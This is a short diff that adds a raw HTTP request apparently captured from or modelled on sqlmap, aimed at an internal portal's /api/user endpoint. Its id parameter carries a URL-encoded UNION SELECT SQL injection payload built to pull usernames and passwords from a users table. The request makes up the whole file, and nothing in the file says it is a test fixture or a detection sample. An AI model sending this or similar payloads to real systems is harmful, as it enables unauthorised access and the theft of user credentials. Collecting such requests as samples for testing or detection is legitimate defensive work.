@@ -1,0 +1,4 @@
+GET /api/user?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users--%20- HTTP/1.1
+Host: internal-portal.local
+User-Agent: sqlmap/1.6.12#stable (https://sqlmap.org)
+Accept: */*
